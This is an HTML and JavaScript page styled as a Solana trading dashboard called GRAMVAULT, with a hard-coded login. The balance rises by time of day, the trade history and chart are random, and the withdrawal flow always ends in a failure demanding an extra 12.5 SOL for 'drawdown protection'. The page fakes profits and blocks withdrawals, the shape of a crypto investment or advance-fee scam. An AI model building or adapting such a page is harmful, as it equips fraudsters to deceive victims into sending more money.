<!DOCTYPE html>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GRAMVAULT | Professional Trading Terminal</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');

```
    :root {
        --primary: #ffffff;
        --success: #ffffff;
        --warning: #ffffff;
        --bg-dark: #000000;
        --bg-card: #0a0a0a;
        --border: rgba(255, 255, 255, 0.08);
        --text-primary: #ffffff;
        --text-secondary: #888888;
    }

    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }

    body {
        background: var(--bg-dark);
        color: var(--text-primary);
        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
        overflow-x: hidden;
        -webkit-font-smoothing: antialiased;
    }

    /* Neon White Animations */
    @keyframes neonGlow {
        0%, 100% {
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.3),
                        0 0 20px rgba(255, 255, 255, 0.2),
                        0 0 30px rgba(255, 255, 255, 0.1);
        }
        50% {
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.5),
                        0 0 40px rgba(255, 255, 255, 0.3),
                        0 0 60px rgba(255, 255, 255, 0.2);
        }
    }

    @keyframes neonPulse {
        0%, 100% {
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5),
                         0 0 20px rgba(255, 255, 255, 0.3),
                         0 0 30px rgba(255, 255, 255, 0.2);
        }
        50% {
            text-shadow: 0 0 20px rgba(255, 255, 255, 0.8),
                         0 0 40px rgba(255, 255, 255, 0.5),
                         0 0 60px rgba(255, 255, 255, 0.3);
        }
    }

    @keyframes fadeIn {
        from { opacity: 0; }
        to { opacity: 1; }
    }

    @keyframes slideUp {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    @keyframes spin {
        to { transform: rotate(360deg); }
    }

    @keyframes pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.6; }
    }

    @keyframes shimmer {
        0% { background-position: -1000px 0; }
        100% { background-position: 1000px 0; }
    }

    /* Login Screen */
    .auth-screen {
        position: fixed;
        inset: 0;
        background: var(--bg-dark);
        z-index: 9999;
        display: flex;
        align-items: center;
        justify-content: center;
        animation: fadeIn 0.5s ease;
    }

    .auth-screen.hidden {
        opacity: 0;
        pointer-events: none;
        transition: opacity 0.5s ease;
    }

    .auth-box {
        width: 100%;
        max-width: 420px;
        padding: 3rem;
        background: var(--bg-card);
        border: 1px solid var(--border);
        border-radius: 2px;
        animation: slideUp 0.6s ease;
        position: relative;
    }

    .auth-box::before {
        content: '';
        position: absolute;
        inset: -1px;
        background: linear-gradient(180deg, var(--primary) 0%, transparent 50%);
        opacity: 0.1;
        border-radius: 2px;
        pointer-events: none;
        animation: neonGlow 3s ease-in-out infinite;
    }

    .auth-logo {
        font-size: 2rem;
        font-weight: 900;
        text-align: center;
        margin-bottom: 0.5rem;
        letter-spacing: 4px;
        color: var(--primary);
        animation: neonPulse 3s ease-in-out infinite;
    }

    .auth-subtitle {
        text-align: center;
        font-size: 0.875rem;
        color: var(--text-secondary);
        margin-bottom: 2.5rem;
        font-weight: 500;
        letter-spacing: 1px;
    }

    .form-group {
        margin-bottom: 1.25rem;
    }

    .form-label {
        display: block;
        font-size: 0.813rem;
        margin-bottom: 0.5rem;
        color: var(--text-secondary);
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .form-input {
        width: 100%;
        background: rgba(255, 255, 255, 0.02);
        border: 1px solid var(--border);
        color: var(--text-primary);
        padding: 1rem 1.125rem;
        border-radius: 2px;
        font-size: 0.95rem;
        transition: all 0.2s ease;
        font-weight: 500;
    }

    .form-input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1),
                    0 0 20px rgba(255, 255, 255, 0.1);
    }

    .error-msg {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid rgba(255, 255, 255, 0.3);
        border-left: 3px solid var(--primary);
        color: var(--primary);
        padding: 0.875rem 1rem;
        border-radius: 2px;
        font-size: 0.875rem;
        margin-bottom: 1.25rem;
        animation: slideUp 0.3s ease;
        font-weight: 500;
    }

    .btn-primary {
        width: 100%;
        background: var(--primary);
        color: #000;
        font-weight: 800;
        padding: 1.125rem;
        border: none;
        border-radius: 2px;
        cursor: pointer;
        font-size: 0.875rem;
        transition: all 0.3s ease;
        text-transform: uppercase;
        letter-spacing: 2px;
        position: relative;
        overflow: hidden;
    }

    .btn-primary::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.1), transparent);
        transform: translateX(-100%);
    }

    .btn-primary:hover {
        background: var(--primary);
        transform: translateY(-2px);
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.5),
                    0 10px 40px rgba(255, 255, 255, 0.3);
    }

    .btn-primary:hover::before {
        animation: shimmer 1.5s ease-in-out;
    }

    /* Dashboard */
    .dashboard {
        display: grid;
        grid-template-rows: auto 1fr;
        height: 100vh;
        animation: fadeIn 0.5s ease;
    }

    /* Header */
    .header {
        background: var(--bg-card);
        border-bottom: 1px solid var(--border);
        padding: 1.5rem 2rem;
        display: flex;
        justify-content: space-between;
        align-items: center;
        position: relative;
    }

    .header::after {
        content: '';
        position: absolute;
        bottom: -1px;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, var(--primary), transparent);
        opacity: 0.3;
        animation: neonGlow 3s ease-in-out infinite;
    }

    .logo {
        font-size: 1.5rem;
        font-weight: 900;
        letter-spacing: 3px;
        color: var(--primary);
        animation: neonPulse 3s ease-in-out infinite;
    }

    .header-right {
        display: flex;
        align-items: center;
        gap: 1.5rem;
    }

    .header-info {
        font-size: 0.813rem;
        color: var(--text-secondary);
        font-weight: 600;
        letter-spacing: 0.5px;
    }

    .btn-withdraw {
        background: var(--primary);
        color: #000;
        font-weight: 800;
        padding: 0.75rem 1.75rem;
        border: none;
        border-radius: 2px;
        cursor: pointer;
        font-size: 0.813rem;
        transition: all 0.2s ease;
        text-transform: uppercase;
        letter-spacing: 1.5px;
        position: relative;
        overflow: hidden;
    }

    .btn-withdraw::before {
        content: '';
        position: absolute;
        inset: 0;
        background: linear-gradient(90deg, transparent, rgba(0, 0, 0, 0.1), transparent);
        transform: translateX(-100%);
    }

    .btn-withdraw:hover {
        background: var(--primary);
        transform: translateY(-2px);
        box-shadow: 0 0 30px rgba(255, 255, 255, 0.5);
    }

    .btn-withdraw:hover::before {
        animation: shimmer 1.5s ease-in-out;
    }

    /* Main Content */
    .content {
        padding: 2rem;
        overflow-y: auto;
        max-height: calc(100vh - 80px);
    }

    .grid-2 {
        display: grid;
        grid-template-columns: 2fr 1fr;
        gap: 1.5rem;
        margin-bottom: 1.5rem;
    }

    .grid-4 {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
        gap: 1rem;
        margin-bottom: 1.5rem;
    }

    /* Cards */
    .card {
        background: var(--bg-card);
        border: 1px solid var(--border);
        border-radius: 2px;
        padding: 2rem;
        transition: all 0.3s ease;
        animation: slideUp 0.6s ease backwards;
        position: relative;
        overflow: hidden;
    }

    .card::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, var(--primary), transparent);
        opacity: 0;
        transition: opacity 0.4s ease;
    }

    .card:hover {
        border-color: rgba(255, 255, 255, 0.2);
        transform: translateY(-4px);
        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5),
                    0 0 40px rgba(255, 255, 255, 0.1);
    }

    .card:hover::before {
        opacity: 0.3;
    }

    .card-label {
        font-size: 0.75rem;
        color: var(--text-secondary);
        text-transform: uppercase;
        letter-spacing: 1.5px;
        margin-bottom: 1rem;
        font-weight: 800;
    }

    .card-value {
        font-size: 2rem;
        font-weight: 900;
        margin-bottom: 0.5rem;
        letter-spacing: -1px;
    }

    .card-value.large {
        font-size: 2.75rem;
        animation: neonPulse 3s ease-in-out infinite;
    }

    .card-meta {
        font-size: 0.875rem;
        color: var(--text-secondary);
        font-weight: 500;
    }

    .text-success {
        color: var(--success);
    }

    .text-primary {
        color: var(--primary);
    }

    .badge {
        display: inline-block;
        padding: 0.5rem 1rem;
        background: rgba(255, 255, 255, 0.05);
        color: var(--success);
        border: 1px solid var(--border);
        border-radius: 2px;
        font-size: 0.875rem;
        font-weight: 700;
        letter-spacing: 0.5px;
        animation: neonGlow 3s ease-in-out infinite;
    }

    /* Chart */
    .chart-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1.5rem;
    }

    .chart-title {
        font-size: 1rem;
        font-weight: 800;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .chart-period {
        font-size: 0.813rem;
        color: var(--text-secondary);
        font-weight: 600;
        letter-spacing: 0.5px;
    }

    canvas {
        width: 100%;
        height: 280px;
    }

    /* Transactions */
    .transactions-title {
        font-size: 1rem;
        font-weight: 800;
        margin-bottom: 1.5rem;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .transaction {
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 1.125rem;
        border-bottom: 1px solid var(--border);
        transition: all 0.2s ease;
    }

    .transaction:last-child {
        border-bottom: none;
    }

    .transaction:hover {
        background: rgba(255, 255, 255, 0.02);
        padding-left: 1.5rem;
    }

    .tx-pair {
        font-size: 0.875rem;
        font-weight: 700;
        margin-bottom: 0.375rem;
        letter-spacing: 0.5px;
    }

    .tx-time {
        font-size: 0.75rem;
        color: var(--text-secondary);
        font-weight: 500;
    }

    .tx-amount {
        font-size: 0.875rem;
        font-weight: 700;
        text-align: right;
        letter-spacing: 0.3px;
    }

    .tx-status {
        font-size: 0.75rem;
        color: var(--text-secondary);
        text-align: right;
        font-weight: 600;
        text-transform: uppercase;
    }

    /* Modal */
    .modal {
        position: fixed;
        inset: 0;
        background: rgba(0, 0, 0, 0.95);
        display: none;
        align-items: center;
        justify-content: center;
        z-index: 9000;
        padding: 1rem;
        animation: fadeIn 0.3s ease;
        backdrop-filter: blur(10px);
    }

    .modal.active {
        display: flex;
    }

    .modal-content {
        background: var(--bg-card);
        border: 1px solid var(--border);
        padding: 2.5rem;
        max-width: 520px;
        width: 100%;
        border-radius: 2px;
        animation: slideUp 0.4s ease;
        position: relative;
    }

    .modal-content::before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        height: 1px;
        background: linear-gradient(90deg, transparent, var(--primary), transparent);
        opacity: 0.3;
        animation: neonGlow 3s ease-in-out infinite;
    }

    .modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 1.5rem;
    }

    .modal-title {
        font-size: 1.25rem;
        font-weight: 900;
        color: var(--warning);
        letter-spacing: 1px;
        text-transform: uppercase;
    }

    .modal-close {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid var(--border);
        color: var(--text-primary);
        width: 36px;
        height: 36px;
        border-radius: 2px;
        cursor: pointer;
        font-size: 1.5rem;
        transition: all 0.2s;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .modal-close:hover {
        background: rgba(255, 255, 255, 0.1);
        border-color: var(--primary);
        transform: rotate(90deg);
    }

    .modal-icon {
        text-align: center;
        font-size: 3.5rem;
        margin-bottom: 1rem;
        animation: neonPulse 2s ease-in-out infinite;
        filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.3));
    }

    .modal-message {
        font-size: 0.95rem;
        line-height: 1.7;
        color: var(--text-secondary);
        margin-bottom: 2rem;
        font-weight: 400;
    }

    .modal-message strong {
        color: var(--primary);
        font-weight: 700;
    }

    /* Loading */
    .loading {
        position: fixed;
        inset: 0;
        background: var(--bg-dark);
        display: flex;
        align-items: center;
        justify-content: center;
        z-index: 10000;
    }

    .spinner {
        width: 50px;
        height: 50px;
        border: 3px solid rgba(255, 255, 255, 0.1);
        border-top: 3px solid var(--primary);
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
    }

    @media (max-width: 768px) {
        .grid-2 {
            grid-template-columns: 1fr;
        }
        .grid-4 {
            grid-template-columns: 1fr;
        }
        .header {
            flex-direction: column;
            gap: 1rem;
            align-items: flex-start;
            padding: 1.25rem 1.5rem;
        }
        .header-right {
            width: 100%;
            justify-content: space-between;
        }
        .btn-withdraw {
            width: 100%;
            text-align: center;
        }
        .content {
            padding: 1.5rem;
        }
        .card {
            padding: 1.5rem;
        }
        .card-value.large {
            font-size: 2.25rem;
        }
        canvas {
            height: 220px;
        }
    }
</style>
```

</head>
<body>

<!-- Auth Screen -->

<div id="auth-screen" class="auth-screen">
    <div class="auth-box">
        <div class="auth-logo">GRAMVAULT</div>
        <div class="auth-subtitle">Professional Trading Terminal</div>
        <div class="form-group">
            <label class="form-label">Username</label>
            <input type="text" id="u_field" class="form-input" placeholder="Enter your username">
        </div>
        <div class="form-group">
            <label class="form-label">Password</label>
            <input type="password" id="p_field" class="form-input" placeholder="Enter your password">
        </div>
        <div id="err"></div>
        <button class="btn-primary" onclick="Engine.initAccess()">Sign In</button>
    </div>
</div>

<!-- Dashboard -->

<div class="dashboard" style="display: none;" id="dashboard">
    <header class="header">
        <div class="logo">GRAMVAULT</div>
        <div class="header-right">
            <div class="header-info" id="session-id">User: Groovy9944</div>
            <div class="header-info" id="clock">00:00:00</div>
            <button class="btn-withdraw" onclick="Engine.triggerWithdraw()">Withdraw</button>
        </div>
    </header>

```
<main class="content">
    <div class="grid-2">
        <div class="card">
            <div class="card-label">Portfolio Balance</div>
            <div class="card-value large" id="main-bal">47.0000 SOL</div>
            <div class="card-meta">‚âà $<span id="usd-value">6,815.00</span> USD</div>
            <div class="badge" style="margin-top: 1rem;">
                <span id="cycle-profit">+0.0000</span> SOL Today
            </div>
        </div>
        <div class="card">
            <div class="card-label">Performance Metrics</div>
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-top: 1rem;">
                <div>
                    <div style="font-size: 0.688rem; color: var(--text-secondary); margin-bottom: 0.5rem; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">Daily Growth</div>
                    <div style="font-size: 1.5rem; font-weight: 900; color: var(--success); letter-spacing: -0.5px;">+3.40 SOL</div>
                </div>
                <div>
                    <div style="font-size: 0.688rem; color: var(--text-secondary); margin-bottom: 0.5rem; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;">System Status</div>
                    <div style="font-size: 1rem; font-weight: 900; color: var(--primary); letter-spacing: 0.5px;">ACTIVE</div>
                </div>
            </div>
        </div>
    </div>

    <div class="grid-4">
        <div class="card" style="animation-delay: 0.1s;">
            <div class="card-label">24h Change</div>
            <div class="card-value text-success" id="change-24h">+0.0000</div>
            <div class="card-meta">SOL</div>
        </div>
        <div class="card" style="animation-delay: 0.2s;">
            <div class="card-label">Total Profit</div>
            <div class="card-value text-success" id="total-profit">+0.0000</div>
            <div class="card-meta">SOL</div>
        </div>
        <div class="card" style="animation-delay: 0.3s;">
            <div class="card-label">Win Rate</div>
            <div class="card-value" id="win-rate">67.5%</div>
            <div class="card-meta">Success Rate</div>
        </div>
        <div class="card" style="animation-delay: 0.4s;">
            <div class="card-label">Network</div>
            <div class="card-value text-primary" style="font-size: 1.125rem;">SOLANA</div>
            <div class="card-meta">Mainnet Beta</div>
        </div>
    </div>

    <div class="card" style="animation-delay: 0.5s; margin-bottom: 1.5rem;">
        <div class="chart-header">
            <div class="chart-title">Balance Trend</div>
            <div class="chart-period">Last 24 Hours</div>
        </div>
        <canvas id="live-graph"></canvas>
    </div>

    <div class="card" style="animation-delay: 0.6s;">
        <div class="transactions-title">Recent Activity</div>
        <div id="ledger-entries"></div>
    </div>
</main>
```

</div>

<!-- Withdrawal Modal - Step 1: Enter Address -->

<div id="withdraw-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="modal-title">Withdraw SOL</div>
            <button class="modal-close" onclick="Engine.closeModal()">√ó</button>
        </div>
        <div class="modal-icon">üí∞</div>
        <p class="modal-message">
            Enter your Solana wallet address to initiate withdrawal. Please ensure the address is correct as transactions cannot be reversed.
        </p>
        <div class="form-group">
            <label class="form-label">Solana Wallet Address</label>
            <input type="text" id="wallet-address" class="form-input" placeholder="Enter your SOL wallet address">
        </div>
        <button class="btn-primary" onclick="Engine.proceedToAmount()">Continue</button>
    </div>
</div>

<!-- Withdrawal Modal - Step 2: Enter Amount -->

<div id="amount-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="modal-title">Withdraw Amount</div>
            <button class="modal-close" onclick="Engine.closeModal()">√ó</button>
        </div>
        <div class="modal-icon">üíé</div>
        <p class="modal-message">
            <strong>Available Balance:</strong> <span id="available-balance">47.0000</span> SOL
            <br><br>
            Enter the amount of SOL you wish to withdraw from your account.
        </p>
        <div class="form-group">
            <label class="form-label">Withdrawal Amount (SOL)</label>
            <input type="number" id="withdraw-amount" class="form-input" placeholder="0.0000" step="0.0001" min="0.0001">
        </div>
        <div class="form-group">
            <label class="form-label">Destination Address</label>
            <input type="text" id="wallet-display" class="form-input" readonly style="background: rgba(255, 255, 255, 0.02); color: var(--text-secondary);">
        </div>
        <button class="btn-primary" onclick="Engine.confirmWithdrawal()">Confirm Withdrawal</button>
    </div>
</div>

<!-- Withdrawal Modal - Step 3: Processing -->

<div id="processing-modal" class="modal">
    <div class="modal-content" style="text-align: center;">
        <div class="modal-icon">‚ö°</div>
        <div class="modal-title" style="margin-bottom: 1.5rem;">Processing Withdrawal</div>
        <p class="modal-message">
            Verifying account balance and processing your withdrawal request. Please wait...
        </p>
        <div class="spinner" style="margin: 2rem auto;"></div>
        <p class="modal-message" style="font-size: 0.813rem; color: var(--text-secondary);">
            This may take a few moments. Do not close this window.
        </p>
    </div>
</div>

<!-- Withdrawal Modal - Step 4: Error -->

<div id="error-modal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <div class="modal-title" style="color: #ef4444;">Withdrawal Failed</div>
            <button class="modal-close" onclick="Engine.closeModal()">√ó</button>
        </div>
        <div class="modal-icon" style="filter: drop-shadow(0 0 20px rgba(239, 68, 68, 0.3));">‚ùå</div>
        <div style="background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); border-left: 3px solid #ef4444; padding: 1.5rem; border-radius: 2px; margin-bottom: 1.5rem;">
            <div style="font-size: 0.938rem; font-weight: 700; color: #ef4444; margin-bottom: 0.5rem; text-transform: uppercase; letter-spacing: 0.5px;">Insufficient Balance</div>
            <div style="font-size: 0.875rem; color: rgba(239, 68, 68, 0.9); line-height: 1.6;">
                Your withdrawal request cannot be completed at this time.
            </div>
        </div>
        <p class="modal-message">
            <strong>Reason:</strong> Your current balance requires additional funds to cover drawdown protection and risk management protocols. This is a standard security measure to protect your account.
            <br><br>
            <strong>What you can do:</strong>
            <br>‚Ä¢ Continue trading to increase your available balance
            <br>‚Ä¢ Allow more time for pending profits to settle
            <br>‚Ä¢ Contact support if you believe this is an error
            <br><br>
            <strong>Required Balance:</strong> Additional <span style="color: var(--primary); font-weight: 700;">12.5000 SOL</span> needed for withdrawal processing.
        </p>
        <button class="btn-primary" onclick="Engine.closeModal()">I Understand</button>
    </div>
</div>

<script>
    const Engine = {
        config: {
            startBal: 47.000,
            targetDaily: 3.4,
            tickRate: 0.14166 / 3600,
            mask: "GV-9944-X"
        },

        state: {
            active: false,
            currentBal: 47.000,
            profit: 0,
            chartData: [],
            withdrawalData: {}
        },

        initAccess() {
            const u = document.getElementById('u_field').value;
            const p = document.getElementById('p_field').value;

            if(u === "Groovy9944" && p === "user39zxnlojp") {
                document.getElementById('auth-screen').classList.add('hidden');
                setTimeout(() => {
                    document.getElementById('auth-screen').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'grid';
                    this.bootSequence();
                }, 500);
            } else {
                document.getElementById('err').innerHTML = '<div class="error-msg">Invalid username or password</div>';
            }
        },

        bootSequence() {
            this.state.active = true;
            this.startPulse();
            this.initGraph();
            this.generateTransactions();
        },

        startPulse() {
            setInterval(() => {
                if(!this.state.active) return;
                
                const now = new Date();
                const secondsToday = (now.getHours() * 3600) + (now.getMinutes() * 60) + now.getSeconds();
                
                this.state.profit = secondsToday * this.config.tickRate;
                this.state.currentBal = this.config.startBal + this.state.profit;

                this.updateUI();
            }, 1000);
        },

        updateUI() {
            document.getElementById('main-bal').innerText = this.state.currentBal.toFixed(4) + ' SOL';
            document.getElementById('usd-value').innerText = (this.state.currentBal * 145).toFixed(2);
            document.getElementById('cycle-profit').innerText = '+' + this.state.profit.toFixed(4);
            document.getElementById('change-24h').innerText = '+' + this.state.profit.toFixed(4);
            document.getElementById('total-profit').innerText = '+' + this.state.profit.toFixed(4);
            document.getElementById('clock').innerText = new Date().toLocaleTimeString();

            if(Math.random() > 0.98) this.updateChart();
        },

        initGraph() {
            const canvas = document.getElementById('live-graph');
            if (!canvas) return;
            
            const ctx = canvas.getContext('2d');
            if (!ctx) return;
            
            const dpr = window.devicePixelRatio || 1;
            const rect = canvas.getBoundingClientRect();
            
            canvas.width = rect.width * dpr;
            canvas.height = rect.height * dpr;
            ctx.scale(dpr, dpr);

            // Generate initial data
            for(let i = 0; i < 24; i++) {
                this.state.chartData.push(47 + (Math.random() - 0.5) * 0.2);
            }

            this.drawChart();
            
            // Handle window resize
            const self = this;
            window.addEventListener('resize', function() {
                if (!canvas) return;
                const rect = canvas.getBoundingClientRect();
                canvas.width = rect.width * dpr;
                canvas.height = rect.height * dpr;
                const ctx = canvas.getContext('2d');
                if (ctx) {
                    ctx.scale(dpr, dpr);
                    self.drawChart();
                }
            });
        },

        updateChart() {
            this.state.chartData.shift();
            this.state.chartData.push(this.state.currentBal);
            this.drawChart();
        },

        drawChart() {
            const canvas = document.getElementById('live-graph');
            if (!canvas) return;
            
            const ctx = canvas.getContext('2d');
            if (!ctx) return;
            
            const dpr = window.devicePixelRatio || 1;
            const w = canvas.width / dpr;
            const h = canvas.height / dpr;
            
            ctx.clearRect(0, 0, canvas.width, canvas.height);

            const data = this.state.chartData;
            if (!data || data.length === 0) return;
            
            const pad = 40;
            const cw = w - pad * 2;
            const ch = h - pad * 2;

            const vals = data;
            const min = Math.min(...vals) - 0.1;
            const max = Math.max(...vals) + 0.1;
            const range = max - min;

            if (range === 0) return;

            // Grid
            ctx.strokeStyle = 'rgba(255, 255, 255, 0.05)';
            ctx.lineWidth = 1;
            for(let i = 0; i <= 4; i++) {
                const y = pad + (ch / 4) * i;
                ctx.beginPath();
                ctx.moveTo(pad, y);
                ctx.lineTo(w - pad, y);
                ctx.stroke();
            }

            // Gradient fill
            const grad = ctx.createLinearGradient(0, pad, 0, h - pad);
            grad.addColorStop(0, 'rgba(255, 255, 255, 0.2)');
            grad.addColorStop(1, 'rgba(255, 255, 255, 0)');

            ctx.beginPath();
            data.forEach((p, i) => {
                const x = pad + (cw / (data.length - 1)) * i;
                const y = pad + ch - ((p - min) / range) * ch;
                if(i === 0) ctx.moveTo(x, y);
                else ctx.lineTo(x, y);
            });
            ctx.lineTo(w - pad, h - pad);
            ctx.lineTo(pad, h - pad);
            ctx.closePath();
            ctx.fillStyle = grad;
            ctx.fill();

            // Main line with neon white glow
            ctx.save();
            ctx.shadowBlur = 20;
            ctx.shadowColor = 'rgba(255, 255, 255, 0.6)';
            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 3;
            ctx.lineJoin = 'round';
            ctx.lineCap = 'round';
            ctx.beginPath();
            data.forEach((p, i) => {
                const x = pad + (cw / (data.length - 1)) * i;
                const y = pad + ch - ((p - min) / range) * ch;
                if(i === 0) ctx.moveTo(x, y);
                else ctx.lineTo(x, y);
            });
            ctx.stroke();
            ctx.restore();

            // Current point indicator
            const lastValue = data[data.length - 1];
            const lastX = w - pad;
            const lastY = pad + ch - ((lastValue - min) / range) * ch;
            
            ctx.beginPath();
            ctx.arc(lastX, lastY, 6, 0, Math.PI * 2);
            ctx.fillStyle = '#ffffff';
            ctx.fill();
            ctx.strokeStyle = '#000000';
            ctx.lineWidth = 3;
            ctx.stroke();

            // Y-axis labels
            ctx.fillStyle = 'rgba(255, 255, 255, 0.5)';
            ctx.font = '700 11px Inter';
            ctx.textAlign = 'right';
            ctx.textBaseline = 'middle';
            ctx.fillText(max.toFixed(2), pad - 5, pad + 5);
            ctx.fillText(min.toFixed(2), pad - 5, h - pad + 5);
        },

        generateTransactions() {
            const container = document.getElementById('ledger-entries');
            const pairs = ['SOL/USDT', 'SOL/USDC', 'SOL/BTC'];
            
            for(let i = 0; i < 10; i++) {
                const win = Math.random() > 0.35;
                const amt = (Math.random() * 0.3 + 0.1).toFixed(4);
                const date = new Date(Date.now() - i * 2 * 3600000);
                const time = date.toLocaleString('en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' });
                
                const row = `
                    <div class="transaction">
                        <div>
                            <div class="tx-pair">${pairs[i % 3]}</div>
                            <div class="tx-time">${time}</div>
                        </div>
                        <div>
                            <div class="tx-amount" style="color: ${win ? '#ffffff' : 'rgba(255, 255, 255, 0.4)'}">
                                ${win ? '+' : '-'}${amt} SOL
                            </div>
                            <div class="tx-status">${win ? 'Win' : 'Loss'}</div>
                        </div>
                    </div>
                `;
                container.innerHTML += row;
            }
        },

        triggerWithdraw() {
            document.getElementById('withdraw-modal').classList.add('active');
        },

        proceedToAmount() {
            const walletAddress = document.getElementById('wallet-address').value.trim();
            
            if (!walletAddress) {
                document.getElementById('wallet-address').style.borderColor = '#ef4444';
                return;
            }
            
            if (walletAddress.length < 32) {
                document.getElementById('wallet-address').style.borderColor = '#ef4444';
                alert('Please enter a valid Solana wallet address');
                return;
            }
            
            // Store wallet address
            this.withdrawalData = { walletAddress: walletAddress };
            
            // Show amount modal
            document.getElementById('withdraw-modal').classList.remove('active');
            document.getElementById('wallet-display').value = walletAddress;
            document.getElementById('available-balance').textContent = this.state.currentBal.toFixed(4);
            
            setTimeout(() => {
                document.getElementById('amount-modal').classList.add('active');
            }, 300);
        },

        confirmWithdrawal() {
            const amount = parseFloat(document.getElementById('withdraw-amount').value);
            
            if (!amount || amount <= 0) {
                document.getElementById('withdraw-amount').style.borderColor = '#ef4444';
                return;
            }
            
            if (amount > this.state.currentBal) {
                document.getElementById('withdraw-amount').style.borderColor = '#ef4444';
                alert('Withdrawal amount exceeds available balance');
                return;
            }
            
            // Store amount
            this.withdrawalData.amount = amount;
            
            // Show processing modal
            document.getElementById('amount-modal').classList.remove('active');
            
            setTimeout(() => {
                document.getElementById('processing-modal').classList.add('active');
                
                // Simulate processing delay (4-6 seconds)
                const processingTime = 4000 + Math.random() * 2000;
                
                setTimeout(() => {
                    document.getElementById('processing-modal').classList.remove('active');
                    
                    setTimeout(() => {
                        document.getElementById('error-modal').classList.add('active');
                    }, 300);
                }, processingTime);
            }, 300);
        },

        closeModal() {
            document.getElementById('withdraw-modal').classList.remove('active');
            document.getElementById('amount-modal').classList.remove('active');
            document.getElementById('processing-modal').classList.remove('active');
            document.getElementById('error-modal').classList.remove('active');
            
            // Reset form fields
            document.getElementById('wallet-address').value = '';
            document.getElementById('withdraw-amount').value = '';
            document.getElementById('wallet-address').style.borderColor = '';
            document.getElementById('withdraw-amount').style.borderColor = '';
        }
    };

    document.addEventListener('keypress', e => {
        if(e.key === 'Enter' && document.getElementById('auth-screen').style.display !== 'none') {
            Engine.initAccess();
        }
    });

    // Prevent zoom on double tap (mobile)
    let lastTouchEnd = 0;
    document.addEventListener('touchend', e => {
        const now = Date.now();
        if (now - lastTouchEnd <= 300) {
            e.preventDefault();
        }
        lastTouchEnd = now;
    }, false);
</script>

</body>
</html>
